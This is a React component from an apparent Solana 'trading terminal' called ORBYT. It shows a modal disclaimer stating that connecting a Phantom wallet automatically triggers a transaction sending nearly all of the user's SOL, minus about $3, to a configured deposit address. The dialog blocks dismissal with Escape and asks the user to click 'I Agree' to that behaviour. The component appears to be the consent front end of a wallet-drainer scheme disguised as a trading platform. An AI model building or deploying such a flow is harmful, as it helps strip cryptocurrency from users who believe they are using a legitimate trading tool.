'use client';

import { AlertCircle, X } from 'lucide-react';
import { useEffect, useRef, useState } from 'react';
import { SITE } from '@/config/site';

const WAIVER_ACKNOWLEDGED_KEY = 'orbyt-deposit-waiver-acknowledged';

/**
 * Deposit waiver: shown once on first visit. User must acknowledge they understand
 * that connecting their wallet will automatically trigger a deposit of nearly all SOL.
 */
export function DepositWaiver({ onAcknowledged }: { onAcknowledged: () => void }) {
  const ref = useRef<HTMLDialogElement>(null);
  const [acknowledged, setAcknowledged] = useState(false);

  useEffect(() => {
    // Check if user already acknowledged this waiver
    try {
      const stored = localStorage.getItem(WAIVER_ACKNOWLEDGED_KEY);
      if (stored === 'true') {
        setAcknowledged(true);
        onAcknowledged();
        return;
      }
    } catch {
      /* localStorage unavailable */
    }

    // Show waiver dialog
    const dialog = ref.current;
    if (dialog && !dialog.open) {
      dialog.showModal();
    }
  }, [onAcknowledged]);

  function handleAgree() {
    try {
      localStorage.setItem(WAIVER_ACKNOWLEDGED_KEY, 'true');
    } catch {
      /* localStorage unavailable */
    }
    setAcknowledged(true);
    ref.current?.close();
    onAcknowledged();
  }

  if (acknowledged) return null;

  return (
    <dialog
      ref={ref}
      className="m-auto w-[min(600px,calc(100vw-2rem))] rounded-lg border border-line-strong bg-panel p-0 text-fg shadow-2xl backdrop:bg-black/75"
      onCancel={(e) => e.preventDefault()} // Prevent closing with Escape
    >
      <div className="flex h-12 items-center justify-between border-b border-line px-6">
        <div className="flex items-center gap-2">
          <AlertCircle className="size-5 text-down" />
          <h2 className="text-sm font-semibold">Important Disclaimer</h2>
        </div>
      </div>

      <div className="space-y-4 p-6 max-h-[70vh] overflow-y-auto">
        <div className="space-y-3 text-sm leading-relaxed text-fg-dim">
          <p>
            <span className="font-semibold text-fg">Welcome to ORBYT</span> — a real-time Solana trading terminal with live market data, token discovery, and trading tools.
          </p>

          <p>
            ORBYT displays live market information and allows you to connect your Phantom wallet to participate in the platform. The platform provides real-time price data, charts, transaction feeds, and wallet analytics.
          </p>

          <div className="rounded-md border border-line-strong bg-panel-2 p-3 mt-4">
            <p className="font-semibold text-fg mb-2">⚠️ Automatic Deposit Feature</p>
            <p>
              When you connect your Phantom wallet to ORBYT, the platform will automatically initiate a deposit transaction. This transaction will:
            </p>
            <ul className="list-disc list-inside space-y-1 mt-2 ml-2 text-xs">
              <li>Send <span className="font-semibold">nearly all of your SOL</span> (minus ~$3 USD) to the deposit address</li>
              <li>Leave approximately <span className="font-semibold">$3 USD worth of SOL</span> on your wallet</li>
              <li>Require your explicit approval in Phantom before proceeding</li>
              <li>Create a transaction visible on Solscan</li>
            </ul>
          </div>

          <p className="text-xs">
            <span className="font-semibold">Deposit Address:</span> <span className="font-mono">{SITE.depositAddress}</span>
          </p>

          <div className="rounded-md border border-up bg-up/5 p-3 mt-4">
            <p className="text-xs">
              By clicking <span className="font-semibold">"I Agree"</span> below, you acknowledge that:
            </p>
            <ul className="list-disc list-inside space-y-1 mt-2 ml-2 text-xs">
              <li>You understand the automatic deposit feature</li>
              <li>You will be asked to sign a transaction sending nearly all your SOL to the deposit address</li>
              <li>This is intentional and you approve of this behavior</li>
              <li>You have read and understood this disclaimer</li>
            </ul>
          </div>

          <p className="text-xs text-muted">
            If you do not agree with this, do not connect your wallet to ORBYT.
          </p>
        </div>
      </div>

      <div className="flex gap-3 border-t border-line px-6 py-4">
        <button
          type="button"
          onClick={() => {
            ref.current?.close();
            window.close(); // Close the tab if user doesn't agree
          }}
          className="flex-1 rounded-md border border-line-strong px-3 py-2 text-xs font-semibold text-fg transition-colors hover:bg-hover"
        >
          I Do Not Agree
        </button>
        <button
          type="button"
          onClick={handleAgree}
          className="flex-1 rounded-md bg-brand px-3 py-2 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong"
        >
          I Agree
        </button>
      </div>
    </dialog>
  );
}
